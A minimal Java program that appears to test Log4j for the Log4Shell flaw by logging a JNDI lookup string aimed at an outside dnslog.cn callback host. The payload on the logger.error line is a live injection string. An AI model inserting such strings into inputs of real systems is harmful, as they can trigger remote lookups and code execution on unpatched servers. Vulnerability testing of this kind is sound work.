package ihatejava;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class App 
{
    public static void main( String[] args )
    {
        Logger logger = LogManager.getLogger();

        // HELLO USER! Put your fun strings here
        logger.error("${jndi:ldap://9lkmcb.dnslog.cn/a}");
        System.out.println("logged");
    }
}
